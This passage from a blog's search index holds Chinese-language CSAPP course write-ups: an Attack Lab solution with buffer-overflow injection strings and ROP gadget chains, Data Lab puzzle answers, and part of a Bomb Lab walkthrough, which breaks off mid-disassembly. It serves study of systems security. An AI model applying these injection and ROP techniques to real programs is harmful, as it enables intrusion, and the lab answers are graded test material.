get_inode(&quot;.&quot;); get_work_dir(parent_inode); printf(&quot;/%s&quot;, buf); }}void inode_to_dirname(ino_t inode_num, char *buf,int buflen){ DIR *dir_ptr; struct dirent *dire; if ((dir_ptr = opendir(&quot;.&quot;)) == NULL){ perror(&quot;.&quot;); exit(1); } while ((dire = readdir(dir_ptr)) != NULL){ if (dire-&gt;d_ino == inode_num){ strncpy(buf, dire-&gt;d_name, buflen); buf[strlen(buf)] = '\\0'; closedir(dir_ptr); return ; } } fprintf(stderr, &quot;error looking for inode number %d\\n&quot;, (int)inode_num); exit(1);} 6.ls在Linux中文件和目录都被组织目录树，每个节点或者是文件或者是目录，U盘等也是挂载到某个特定的目录，所以ls只要考虑这两种情况，不需要去考虑分区。 目录是一种特殊的文件。 打开当前目录的对应的dirp文件； DIR* dir_ptr = opendir(&quot;.&quot;); 读取当前目录的dir_ptr结构中的文件名，并打印； direntp = readdir(dir_ptr) printf(&quot;%s\\n&quot;, direntrp-&gt;name); 最后关闭打开的dirp文件； 问题 1、怎么样把mode：100644转化为”-rw-r–r–”？ 2、user: 1000怎么样转化为tfzhang？ 3、group: 1000怎么样转化为tfzhang？ 4、变换modtime？ 与操作提取数字位 通过每位与操作，将每组的rwx位提取出来；比如要提取右起第3位，只要将数值100644与4这个数进行与操作； 7.cat复习不完了，:cry: . 考完了，还算顺利，注意下各种函数的参数位置，着重复习线程与进程还有pwd，cat，ls的实现，没了，挂不了。","link":"/2021/06/24/linux%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/"},{"title":"[csapp] Lab3 Attack Lab","text":"Lab3 Attack Lab1. Introduction此实验用来熟悉，理解程序运行的时候的 stack 模型。更进一步理解 stack 上可能发生的错误，对常见的攻击手段有深入理解。 2. ctarget(代码注入)对于没有进行如下限制的程序可以使用此方法来进行攻击 申请的stack空间不是随机的，是固定的。 使用了不安全的写入方法，或者使用了低级的io，且没有人为的判断缓冲溢出的程序 没有限制内存中的某些stack区域中的指令不能被执行。 2.1 Level 1要求对 buf 的缓冲区进行溢出，进而让 test 函数不会正常返回，而是运行到 touch1 函数。显然我们需要把 test 栈顶的 ret 指针指向的位置进行覆盖，来指向 touch1 函数。通过 objdump -d 指令，得到 ctarget 的汇编代码，找到 touch1 的位置在 00000000004017c0 &lt;touch1&gt; 。在 lab 给出的 writeup 中，我们知道 test 函数 c code 如下： 1234561 void test()2{3 int val;4 val = getbuf();5 printf(&quot;No exploit. Getbuf returned 0x%x\\n&quot;, val);6 } 其调用了 getbuf() 函数， 查看该函数的汇编代码如下: 12345678900000000004017a8 &lt;getbuf&gt;: 4017a8: 48 83 ec 28 sub $0x28,%rsp 4017ac: 48 89 e7 mov %rsp,%rdi 4017af: e8 8c 02 00 00 callq 401a40 &lt;Gets&gt; 4017b4: b8 01 00 00 00 mov $0x1,%eax 4017b9: 48 83 c4 28 add $0x28,%rsp 4017bd: c3 retq 4017be: 90 nop 4017bf: 90 nop 可以得知，该函数在 stack 中申请了 40 bytes，所以我们需要污染41→48 bytes。显然，我们可以得到最简单的注入编码如下： 12345600 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 可以画出这个攻击的最终内存形态如下： Figure1: referenced from [1] 2.2 Level 2这个题目要求 test 函数会执行 touch2 函数， 而 touch2 函数需要一个存储了 cookie 无符号整型的 %rdi，所以我们需要首先把 %rdi 存储这个 cookie 值， 然后再跳转到 touch2 函数。 需要使用到 movq $(cookie), %rdi 的指令，这里 cookie 由下载来的作业中的 cookie 来定。 所以首先写一个包含这个指令的 x.s 文件， 然后使用 gcc -c x.s 来得到 object 文件，然后使用 objdump -d 来得到最终的指令为 48 c7 c7 fa 97 69 59 ， 所以基本的思路是这样的： movq $cookie, %rdi pushq (address of touch2) ret Aside 这里 ret 和 pushq 的作用似乎非常让人疑惑，为什么 ret 会回到 pushq 的地址？这里的 ret 使用的是近返回，近返回的方法是把栈顶之值弹出到指令指针寄存器IP中，然后从这个弹出的指针处进行执行。 Figurew: Referenced from [2] 看图，这是两个不同的指令，编码都不一样。ret表示近返回，retf表示远返回。 所以使用 gcc -c 指令编码如下的程序 123movq $cookie, %rdi # change cookie to your own one.pushq %rspret 这里就需要找到 getbuf 的栈顶在哪里，我们需要把 test 函数的 ret 函数的 ret address 换成 getbuf 的 栈顶。使用 gdb 调试， 把断点打在 getbuf 初始化完 %rsp 的位置。然后 run -q 运行，并使用 info r rsp 得到寄存器目前存储的地址信息。可以得到如下的答案。 12345648 c7 c7 fa 97 b9 59 68ec 17 40 00 c3 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0078 dc 61 55 00 00 00 00 可以画出这个攻击的最终内存形态如下： Figure3: Referenced from [1] 2.3 Level 3这个题目要求 test 函数会执行 touch3 函数， 而 touch3 函数需要一个存储了 cookie 字符串的 %rdi，所以我们需要首先把 %rdi 存储这个 cookie 字符串的指针值， 然后再跳转到 touch3 函数。 所以这里的思路就是需要把 字符串首先存储到一个位置， 然后把这个位置的首地址传给 %rdi， 然后进入到 touch3 函数执行。 ！但是这里 writeup 让我们注意的是当调用hexmatch和strncmp时，他们会把数据压入到栈中，有可能会覆盖getbuf栈帧的数据，所以传进去字符串的位置必须小心谨慎。hexmatch 开辟了110字节的栈帧，strncmp 也会开辟空间，但是就代码来看，*s存放的地址是随机的，如果我们将数据放在 getbuf 的栈空间里面，很有可能就被这两个函数覆盖了。所以在这里的思路是，把字符串传入到 caller→test 的stack 区域中，这样字符串可以避免被覆盖。 ！对于 ascii 码， 我们可以使用 man ascii 来查看对应 ascii 码的 hex 形式。 ！字符串 必须以 \\0 结尾。 那么对应的思路如下： 把 字符串 传入到 test 栈区中。 把 字符串的指针 传给 %rdi pushq touch3 地址 ret 至于怎么取到字符串的指针，怎么得到这些指令的编码，与 section 2.2 中一致。 1234567848 c7 c7 a8 dc 61 55 68 # mov and pushfa 18 40 00 c3 00 00 00 # push and ret00 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0078 dc 61 55 00 00 00 00 # pointer to test stack top35 39 62 39 39 37 66 61 # string of cookie00 # '\\0' for string. 可以画出这个攻击的最终内存形态如下： Figure4: Referenced from [1] 3. rtarget(Return-Oriented Programming)在 section 2 ctarget 中三条都被启用的情况下，只能使用这个方法。 3.0 review 在栈使用了 randomization 来初始化 stack frame 大小；限制了 memory 中 stack 某些区块的代码执行权限的情况下，需要使用 Return-Oriented Programming 的方法，这个方法的基本想法就是使用已经存在的指令来作为自己的指令执行，从而绕开 stack 区域中的限制。一般而言，可以使用的指令后面需要跟有一个 ret 来返回，通过一系列的指令 [op, ret]-&gt;[op, ret]-&gt;... 可以形成一个 list， 这个形似单链表的结构就是我们的指令的组成。 比如下面的这个具体的例子： 有如下的 c code 123void setval_210(unsigned *p){*p = 3347663060U;} 得到 assembly code： 1230000000000400f15 &lt;setval_210&gt;: 400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi) 400f1b: c3 retq 上面这个 assembly code 就可以作为我们的 list 中的一个 node。 比如 48 89 c7 就是 movl %rax, %rdi 的一个指令代码，并且已经存在于 可执行代码块中，所以我们可以让 pc(program counter) 指向这个位置 0x400f15 + 4 来指向这个 movl 指令，在执行完以后需要立即 ret，然后执行到下一个 node。 3.1 Level 2这个题目让我们做的和上一个 ctarget 中的 level 2 一致。但是我们需要使用 gadget list 来组成所有需要的指令。根据之前的思路，我们是直接把 cookie 存储到 %rdi，需要使用到 movq 和 pop 指令。根据 writeup 的提示，这是可以被使用的 gadget node： 1234567891011121314151617181920212223242526272829303132333435363738390000000000000000 &lt;start_farm&gt;: 0: b8 01 00 00 00 mov $0x1,%eax 5: c3 retq 0000000000000006 &lt;getval_142&gt;: 6: b8 fb 78 90 90 mov $0x909078fb,%eax b: c3 retq 000000000000000c &lt;addval_273&gt;: c: 8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax 12: c3 retq 0000000000000013 &lt;addval_219&gt;: 13: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 19: c3 retq 000000000000001a &lt;setval_237&gt;: 1a: c7 07 48 89 c7 c7 movl $0xc7c78948,(%rdi) 20: c3 retq 0000000000000021 &lt;setval_424&gt;: 21: c7 07 54 c2 58 92 movl $0x9258c254,(%rdi) 27: c3 retq 0000000000000028 &lt;setval_470&gt;: 28: c7 07 63 48 8d c7 movl $0xc78d4863,(%rdi) 2e: c3 retq 000000000000002f &lt;setval_426&gt;: 2f: c7 07 48 89 c7 90 movl $0x90c78948,(%rdi) 35: c3 retq 0000000000000036 &lt;getval_280&gt;: 36: b8 29 58 90 c3 mov $0xc3905829,%eax 3b: c3 retq 000000000000003c &lt;mid_farm&gt;: 3c: b8 01 00 00 00 mov $0x1,%eax 41: c3 retq 而我们需要的代码是： 12popq %raxmovq %rax, %rdi popq %rax的指令字节为：58，所以我们找到了如下函数： 12300000000004019a7 &lt;addval_219&gt;: 4019a7: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 4019ad: c3 从中我们可以得出popq %rax指令的地址为：0x4019ab movq %rax, %rdi的指令字节为：48 89 c7，所以我们找到了如下函数： 12300000000004019a0 &lt;addval_273&gt;: 4019a0: 8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax 4019a6: c3 从中我们可以得出movq %rax, %rdi指令的地址为：0x4019a2 最终可以得出需要的指令为 12345678900 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00ab 19 40 00 00 00 00 00 # popq %raxfa 97 b9 59 00 00 00 00 # cookie need for movq, will be poped to %rax.a2 19 40 00 00 00 00 00 # movqec 17 40 00 00 00 00 00 # touch2 3.2 Level 3这个题目让我们做的和上一个 ctarget 中的 level 3 一致。但是我们需要使用 gadget list 来组成所有需要的指令。 因为每次栈的位置是随机的，所以无法直接用地址来索引字符串的起始地址，只能用栈顶地址 + 偏移量来索引字符串的起始地址。对于获得偏移量的操作，leaq(, , ),%rax 这个操作是 gcc 经常用来获得偏移量的一个指令。 我们可以得到下面的方法： （1）首先获取到%rsp的地址，并且传送到%rdi（2）其二获取到字符串的偏移量值，并且传送到%rsi（3）lea (%rdi,%rsi,1),%rax, 将字符串的首地址传送到%rax, 再传送到%rdi（4）调用touch3函数 具体的 geaget 从frame.c 函数的 dump 文件中找到就行 最终的答案是： 1234567891011121314151600 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00ad 1a 40 00 00 00 00 00a2 19 40 00 00 00 00 00ab 19 40 00 00 00 00 0048 00 00 00 00 00 00 00dd 19 40 00 00 00 00 0034 1a 40 00 00 00 00 0013 1a 40 00 00 00 00 00d6 19 40 00 00 00 00 00a2 19 40 00 00 00 00 00fa 18 40 00 00 00 00 0035 39 62 39 39 37 66 61 Reference [1] https://www.jianshu.com/p/db731ca57342 [2] https://www.zhihu.com/question/364589259","link":"/2022/02/11/%5Bcsapp%5D%20Lab3%20Attack%20Lab/"},{"title":"[csapp] Lab1 Data Lab","text":"Lab1 Data Lab: Manipulating Bits1. IntroductionInstruction: http://csapp.cs.cmu.edu/3e/datalab.pdf The purpose of this assignment is to become more familiar with bit-level representations of integers and floating point numbers. You’ll do this by solving a series of programming “puzzles.” Many of these puzzles are quite artificial, but you’ll find yourself thinking much more about bits in working your way through them. 本实验的实验环境Unix-like system，需要使用gcc编译32位程序。再ubuntu20版本中，也许需要安装32位、64位同时支持的gcc 2. Puzzles2.1 bitXor1234567891011/* * bitXor - x^y using only ~ and &amp; * Example: bitXor(4, 5) = 1 * Legal ops: ~ &amp; * Max ops: 14 * Rating: 1 */int bitXor(int x, int y) { int ans = (~(x&amp;y))&amp;(~((~x)&amp;(~y))); return ans;} bitXor的情况比较简单，可以使用真值表，画出卡诺图的方法来化简。 2.2 Tmin12345678910/* * tmin - return minimum two's complement integer * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 4 * Rating: 1 */int tmin(void) { int ans = 0x1 &lt;&lt; 31; return ans;} 根据定义，Tmin是0x80000000，直接使用移位操作就行。 2.3 isTmax1234567891011/* * isTmax - returns 1 if x is the maximum, two's complement number, * and 0 otherwise * Legal ops: ! ~ &amp; ^ | + * Max ops: 10 * Rating: 1 */int isTmax(int x) { int ans = (!((x+1)^(~x)))&amp;(!!((~x)^(0x0))); return ans;} 这个看起来比较困难，但是考虑一下规律 Tmax+1 = Tmin，～Tmax = Tmin，可以通过这两点来判断一个数是否是Tmax，但是，需要注意的是当x的值是0xFFFFFFFF时，也是符合这个规律的，后面的其他puzzles也有这个特例，需要注意。 注意这里!!的作用，当!!(非零)输出1，反之输出0 2.4 allOddBits123456789101112131415/* * allOddBits - return 1 if all odd-numbered bits in word set to 1 * where bits are numbered from 0 (least significant) to 31 (most significant) * Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 12 * Rating: 2 */int allOddBits(int x) { int ans = 0; int msk = 0xAA + (0xAA &lt;&lt; 8); msk = msk + (msk &lt;&lt; 16); ans = !((msk&amp;x)^msk); return ans;} 这里使用odd-Mask来获得在奇数位上的mask，然后把这个mask应用到输入的数中。 2.5 negate1234567891011/* * negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 5 * Rating: 2 */int negate(int x) { int ans = ~x + 1; return ans;} 最基本的补码操作。 2.6 isAsciiDigit12345678910111213141516/* * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters '0' to '9') * Example: isAsciiDigit(0x35) = 1. * isAsciiDigit(0x3a) = 0. * isAsciiDigit(0x05) = 0. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 15 * Rating: 3 */int isAsciiDigit(int x) { int sign = 0x1 &lt;&lt; 31; int upbound = ~(sign|0x39); int lowbound = ~0x30+1; int ans = !((sign&amp;(upbound+x)&gt;&gt;31)|(sign&amp;(lowbound+x)&gt;&gt;31)); return ans;} 一个不是非常显然的trick，非常的巧妙，判断这个数是否在0x30和0x39之间的条件是，(0x30+1)+x应当大于0，而(Tmin+0x39) =-(Tmin+0x39)-1，这里-1的目的是因为Tamx=2^32-1, Tmin=-2^32，这里用到的性质就是判断-(Tmin+0x39)-1+x是否“溢出”到负数。 2.7 conditional123456789101112/* * conditional - same as x ? y : z * Example: conditional(2,4,5) = 4 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 16 * Rating: 3 */int conditional(int x, int y, int z) { x = !!x; x = ~x + 1; return (x&amp;y)|((~x)&amp;z);} 双目运算符实现，在 2.3 中已经说明了!!的用途，这里首先判断x是否是0，如果x是0，x的值应当是0x00000000，反之是0x00000001，所以为了下面并操作的方便对x取负数，则x是0的时候，x=0x00000000，x=0x11111111，接下来就直接或操作，输出一个真值就行。 2.8 isLessOrEqual123456789101112131415161718/* * isLessOrEqual - if x &lt;= y then return 1, else return 0 * Example: isLessOrEqual(4,5) = 1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 24 * Rating: 3 */int isLessOrEqual(int x, int y) { int negX=~x+1; int addX=negX+y; int checkSign = addX&gt;&gt;31&amp;1; int leftBit = 1&lt;&lt;31; int xLeft = x&amp;leftBit; int yLeft = y&amp;leftBit; int bitXor = xLeft ^ yLeft; bitXor = (bitXor&gt;&gt;31)&amp;1; return ((!bitXor)&amp;(!checkSign))|(bitXor&amp;(xLeft&gt;&gt;31));} 思考：为什么不能直接判断y-x的正负? 当y=0x7FFFFFFF且x=0x80000000时，显然y-x已经超过了32位能表示的范围，所以这样判断时不准确的。如果符号相同，用减法的话时不会出现这个情况的。 分类讨论：当符号相同的时候，看addX的符号位；当符号不同的时候直接输出。 2.9 logicalNeg1234567891011/* * logicalNeg - implement the ! operator, using all of * the legal operators except ! * Examples: logicalNeg(3) = 0, logicalNeg(0) = 1 * Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 1 * Rating: 4 */int logicalNeg(int x) { return ((x|(~x+1))&gt;&gt;31)+1;} 非0为1，其余的情况为0。利用补码来实现，显然，只有0和Tmin的补码为本身，其余都是相反数。所以可以利用这个性质，将一个数(除了0和Tmin)与其补码做与操作，做与操作我们需要的结果实际上就是判断这个数和他的补码是不是在符号位上不一样，所以我们&gt;&gt;31用来取到这个数的符号位，如果符号位是0，代表这个数是0，否则是其他的数。 2.10 howManyBits1234567891011121314151617181920212223242526272829/* howManyBits - return the minimum number of bits required to represent x in * two's complement * Examples: howManyBits(12) = 5 * howManyBits(298) = 10 * howManyBits(-5) = 4 * howManyBits(0) = 1 * howManyBits(-1) = 1 * howManyBits(0x80000000) = 32 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 90 * Rating: 4 */int howManyBits(int x) { int b0,b1,b2,b4,b8,b16; int sign = x &gt;&gt; 31; x = (sign&amp;~x)|(~sign&amp;x); b16 = !!(x&gt;&gt;16)&lt;&lt;4; x = x &gt;&gt; b16; b8 = !!(x&gt;&gt;8)&lt;&lt;3; x = x &gt;&gt; b8; b4 = !!(x&gt;&gt;4)&lt;&lt;2; x = x &gt;&gt; b4; b2 = !!(x&gt;&gt;2)&lt;&lt;1; x = x &gt;&gt; b2; b1 = !!(x&gt;&gt;1); x = x &gt;&gt; b1; b0 = x; return b16+b8+b4+b2+b1+b0+1;} 首先判断符号位子，把所有的负数全部都转换成正数。因为在正数中最大一位必定是1，而负数中最大的一位是0，不好判断。而对于Tmin，转换后还是Tmin，所以不会因为转换成正数，超出正数的表示范围而出问题。然后，使用折半的方法来查找。注意运算顺序，在b16 = !!(x&gt;&gt;16)&lt;&lt;4;中，先运算!!(x&gt;&gt;16)再做&lt;&lt;4操作，这里的意思是，先看高16位有没有1，有的话那么低16位肯定都需要用到，则b16=0x00000001&lt;&lt;4，那么再检查高16位中的高8位有没有1……，延续这些步骤直到最后一位。 2.11 floatScale2123456789101112131415161718192021//float/* * floatScale2 - Return bit-level equivalent of expression 2*f for * floating point argument f. * Both the argument and result are passed as unsigned int's, but * they are to be interpreted as the bit-level representation of * single-precision floating point values. * When argument is NaN, return argument * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 */unsigned floatScale2(unsigned uf) { int exp = (uf&amp;0x7f800000)&gt;&gt;23; int sign = uf&amp;(1&lt;&lt;31); if(exp==0) return uf&lt;&lt;1|sign; if(exp==255) return uf; exp++; if(exp==255) return 0x7f800000|sign; return (exp&lt;&lt;23)|(uf&amp;0x807fffff);} 本函数要求使用 unsigned int 来表示float，并计算2float，首先，明确unsigned int 在 IA32 计算机中的位数，一共32位，那么sign占一位，exp占8位，M占23位。那么对于2f来说，只要修改exp就行了。但是存在特殊情况，当exp==0时，是非规格化的情况，直接M&lt;&lt;1就行；当exp==0xFF时，代表NaN，直接返回。再对exp++，就可以。在增加过后，还需要检查exp是否正确，当exp==0xFF，返回原符号的无穷大。否则，返回指数加一以后的数。 2.12 floatFloat2Int12345678910111213141516171819202122232425262728/* * floatFloat2Int - Return bit-level equivalent of expression (int) f * for floating point argument f. * Argument is passed as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point value. * Anything out of range (including NaN and infinity) should return * 0x80000000u. * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 */int floatFloat2Int(unsigned uf) { int s_ = uf&gt;&gt;31; int exp_ = ((uf&amp;0x7f800000)&gt;&gt;23)-127; int frac_ = (uf&amp;0x007fffff)|0x00800000; if(!(uf&amp;0x7fffffff)) return 0; if(exp_ &gt; 31) return 0x80000000; if(exp_ &lt; 0) return 0; if(exp_ &gt; 23) frac_ &lt;&lt;= (exp_-23); else frac_ &gt;&gt;= (23-exp_); if(!((frac_&gt;&gt;31)^s_)) return frac_; else if(frac_&gt;&gt;31) return 0x80000000; else return ~frac_+1;} float to int. float中frac部分是大于等于1的，因为这样可以免费的拿到一个精度。如果真实的指数大于31，那么在转换为int时候，1&lt;&lt;31会覆盖掉符号位，所以exp &gt; 31 就算是int溢出了，我们就直接返回溢出值0x80000000。如果exp &lt; 0 那么就只有小数，直接舍去。接下来就是要把23位的小数部分全部转化为整数，然后判断溢出，再舍去小数部分。如果和原符号相同则直接返回，否则如果结果为负（原来为正）则溢出返回越界指定值0x80000000u，否则原来为负，结果为正(因为这里运算的时候是只计算了frac，而frac在1~2之间，没有考虑原来的符号位)，则需要返回其补码（相反数）。 2.13 floatPower21234567891011121314151617181920/* * floatPower2 - Return bit-level equivalent of the expression 2.0^x * (2.0 raised to the power x) for any 32-bit integer x. * * The unsigned value that is returned should have the identical bit * representation as the single-precision floating-point number 2.0^x. * If the result is too small to be represented as a denorm, return * 0. If too large, return +INF. * * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while * Max ops: 30 * Rating: 4 */unsigned floatPower2(int x) { int INF = 0xff&lt;&lt;23; int exp = x + 127; if(exp &lt;= 0) return 0; if(exp &gt;= 255) return INF; return exp &lt;&lt; 23;} 我们需要求的是 $2^{x}$，其sign=1，exp=1+127=128，frac=1.0-1=0，所以可以表示为 $2.0^{x}=(1.0\\times 2)^{x}=1.0 \\times 2^{x}$，所以，我们传进来的x就是可以当作exp(减去128后的)用的。但是任然需要判断exp的范围是否正确。exp&lt;&lt;23是把exp放到正确的float位置上。 3. Conclution本实验在Ubuntu20.04 VM上运行。 最终结果如下： 12345678910111213141516171819202122232425262728293031323334351. Running './dlc -z' to identify coding rules violations.2. Compiling and running './btest -g' to determine correctness score.gcc -O -Wall -m32 -lm -o btest bits.c btest.c decl.c tests.cbtest.c: In function ‘test_function’:btest.c:332:23: warning: ‘arg_test_range[1]’ may be used uninitialized in this function [-Wmaybe-uninitialized] 332 | if (arg_test_range[1] &lt; 1) | ~~~~~~~~~~~~~~^~~3. Running './dlc -Z' to identify operator count violations.4. Compiling and running './btest -g -r 2' to determine performance score.gcc -O -Wall -m32 -lm -o btest bits.c btest.c decl.c tests.cbtest.c: In function ‘test_function’:btest.c:332:23: warning: ‘arg_test_range[1]’ may be used uninitialized in this function [-Wmaybe-uninitialized] 332 | if (arg_test_range[1] &lt; 1) | ~~~~~~~~~~~~~~^~~5. Running './dlc -e' to get operator count of each function.Correctness Results Perf ResultsPoints Rating Errors Points Ops Puzzle1 1 0 2 7 bitXor1 1 0 2 1 tmin1 1 0 2 9 isTmax2 2 0 2 7 allOddBits2 2 0 2 2 negate3 3 0 2 13 isAsciiDigit3 3 0 2 8 conditional3 3 0 2 17 isLessOrEqual4 4 0 2 5 logicalNeg4 4 0 2 36 howManyBits4 4 0 2 14 floatScale24 4 0 2 21 floatFloat2Int4 4 0 2 5 floatPower2 本实验中有很多的trick挺难想的，我在做的过程中也在网上看了solution，虽然CMU的honor code里规定的挺严格的。这个实验的最终目的是为了从熟知到深知到理解信息的表示和处理，用unsigned int 来表示float确实理解更为深刻了。还需要看书巩固一下。","link":"/2022/01/30/%5Bcsapp%5D%20Lab1%20Data%20Lab/"},{"title":"[csapp] Lab2 Bomb Lab","text":"Lab2 Bomb Lab1. Introduction熟悉GDB调试工具，熟悉 objdump 反汇编，熟悉汇编代码阅读。 2. Puzzle2.1 Phase 1首先使用 objdump -d bomb 获得bomb文件的反编译代码。可以在 0000000000400da0 &lt;main&gt;:函数中找到 phase_1 的函数入口。 1234400e32: e8 67 06 00 00 callq 40149e &lt;read_line&gt;400e37: 48 89 c7 mov %rax,%rdi400e3a: e8 a1 00 00 00 callq 400ee0 &lt;phase_1&gt;400e3f: e8 80 07 00 00 callq 4015c4 &lt;phase_defused&gt; 跳转到 phase_1 函数 1234567890000000000400ee0 &lt;phase_1&gt;: 400ee0: 48 83 ec 08 sub $0x8,%rsp 400ee4: be 00 24 40 00 mov $0x402400,%esi 400ee9: e8 4a 04 00 00 callq 401338 &lt;strings_not_equal&gt; 400eee: 85 c0 test %eax,%eax 400ef0: 74 05 je 400ef7 &lt;phase_1+0x17&gt; 400ef2: e8 43 05 00 00 callq 40143a &lt;explode_bomb&gt; 400ef7: 48 83 c4 08 add $0x8,%rsp 400efb: c3 retq 这段代码只是在比对两个值。我们可以看到 $0x402400 被移动到了 %esi 中，其实我们已经可以猜到这个就是答案，再gdb中查看这个地址里面存储的string，得到 Border relations with Canada have never been better. 。至此，第一个puzzle解除。 我们在这里再分析一下 callq 401338 &lt;strings_not_equal&gt; 函数。下面使用 -- 表示注释 1234567891011121314151617181920212223242526272829303132333435363738390000000000401338 &lt;strings_not_equal&gt;: ;-- input is(char* a, char*b) 401338: 41 54 push %r12; -- callee saved 40133a: 55 push %rbp; -- callee saved 40133b: 53 push %rbx; -- callee saved 40133c: 48 89 fb mov %rdi,%rbx; -- parameter1 type:char* 40133f: 48 89 f5 mov %rsi,%rbp; -- parameter2 type:char* 401342: e8 d4 ff ff ff callq 40131b &lt;string_length&gt; 401347: 41 89 c4 mov %eax,%r12d; --%r12d len(char* a) 40134a: 48 89 ef mov %rbp,%rdi 40134d: e8 c9 ff ff ff callq 40131b &lt;string_length&gt; 401352: ba 01 00 00 00 mov $0x1,%edx 401357: 41 39 c4 cmp %eax,%r12d --% last len is store in %eax 40135a: 75 3f jne 40139b &lt;strings_not_equal+0x63&gt; 40135c: 0f b6 03 movzbl (%rbx),%eax 40135f: 84 c0 test %al,%al 401361: 74 25 je 401388 &lt;strings_not_equal+0x50&gt; 401363: 3a 45 00 cmp 0x0(%rbp),%al 401366: 74 0a je 401372 &lt;strings_not_equal+0x3a&gt; 401368: eb 25 jmp 40138f &lt;strings_not_equal+0x57&gt; 40136a: 3a 45 00 cmp 0x0(%rbp),%al 40136d: 0f 1f 00 nopl (%rax) 401370: 75 24 jne 401396 &lt;strings_not_equal+0x5e&gt; 401372: 48 83 c3 01 add $0x1,%rbx 401376: 48 83 c5 01 add $0x1,%rbp 40137a: 0f b6 03 movzbl (%rbx),%eax 40137d: 84 c0 test %al,%al 40137f: 75 e9 jne 40136a &lt;strings_not_equal+0x32&gt;; --char loop 401381: ba 00 00 00 00 mov $0x0,%edx 401386: eb 13 jmp 40139b &lt;strings_not_equal+0x63&gt; 401388: ba 00 00 00 00 mov $0x0,%edx 40138d: eb 0c jmp 40139b &lt;strings_not_equal+0x63&gt; 40138f: ba 01 00 00 00 mov $0x1,%edx 401394: eb 05 jmp 40139b &lt;strings_not_equal+0x63&gt; 401396: ba 01 00 00 00 mov $0x1,%edx 40139b: 89 d0 mov %edx,%eax; -- return not eql is true 40139d: 5b pop %rbx 40139e: 5d pop %rbp 40139f: 41 5c pop %r12 4013a1: c3 retq 本函数先是判断两个字符串的长度，然后再逐字符判断，如果两个字符串的长度不相等，或者其中有字符不相等，那么返回 true ，反之返回 false 。 2.2 phase 2同理，找到 phase_2 的函数入口 12345678910111213141516171819202122232425260000000000400efc &lt;phase_2&gt;: 400efc: 55 push %rbp 400efd: 53 push %rbx 400efe: 48 83 ec 28 sub $0x28,%rsp 400f02: 48 89 e6 mov %rsp,%rsi 400f05: e8 52 05 00 00 callq 40145c &lt;read_six_numbers&gt; 400f0a: 83 3c 24 01 cmpl $0x1,(%rsp) 400f0e: 74 20 je 400f30 &lt;phase_2+0x34&gt; 400f10: e8 25 05 00 00 callq 40143a &lt;explode_bomb&gt; 400f15: eb 19 jmp 400f30 &lt;phase_2+0x34&gt; 400f17: 8b 43 fc mov -0x4(%rbx),%eax 400f1a: 01 c0 add %eax,%eax 400f1c: 39 03 cmp %eax,(%rbx) 400f1e: 74 05 je 400f25 &lt;phase_2+0x29&gt; 400f20: e8 15 05 00 00 callq 40143a &lt;explode_bomb&gt; 400f25: 48 83 c3 04 add $0x4,%rbx 400f29: 48 39 eb cmp %rbp,%rbx 400f2c: 75 e9 jne 400f17 &lt;phase_2+0x1b&gt; 400f2e: eb 0c jmp 400f3c &lt;phase_2+0x40&gt; 400f30: 48 8d 5c 24 04 lea 0x4(%rsp),%rbx 400f35: 48 8d 6c 24 18 lea 0x18(%rsp),%rbp 400f3a: eb db jmp 400f17 &lt;phase_2+0x1b&gt; 400f3c: 48 83 c4 28 add $0x28,%rsp 400f40: 5b pop %rbx 400f41: 5d pop %rbp 400f42: c3 retq 这段代码实际上是一个非常简单的循环。可以看到在 callee-saved 参数后，申请了 28 byte的内存。之后把栈顶的 %rsp mov to %rsi 是因为在之后 call 的函数中又会覆盖掉 %rsp 现有的参数，所以先做了备份，然后进入了 read_six_number函数，这个函数显然是读入6个数字。我们进入到这个函数具体看。 123456789101112131415161718000000000040145c &lt;read_six_numbers&gt;: 40145c: 48 83 ec 18 sub $0x18,%rsp 401460: 48 89 f2 mov %rsi,%rdx 401463: 48 8d 4e 04 lea 0x4(%rsi),%rcx 401467: 48 8d 46 14 lea 0x14(%rsi),%rax 40146b: 48 89 44 24 08 mov %rax,0x8(%rsp) 401470: 48 8d 46 10 lea 0x10(%rsi),%rax 401474: 48 89 04 24 mov %rax,(%rsp) 401478: 4c 8d 4e 0c lea 0xc(%rsi),%r9 40147c: 4c 8d 46 08 lea 0x8(%rsi),%r8 401480: be c3 25 40 00 mov $0x4025c3,%esi 401485: b8 00 00 00 00 mov $0x0,%eax 40148a: e8 61 f7 ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; 40148f: 83 f8 05 cmp 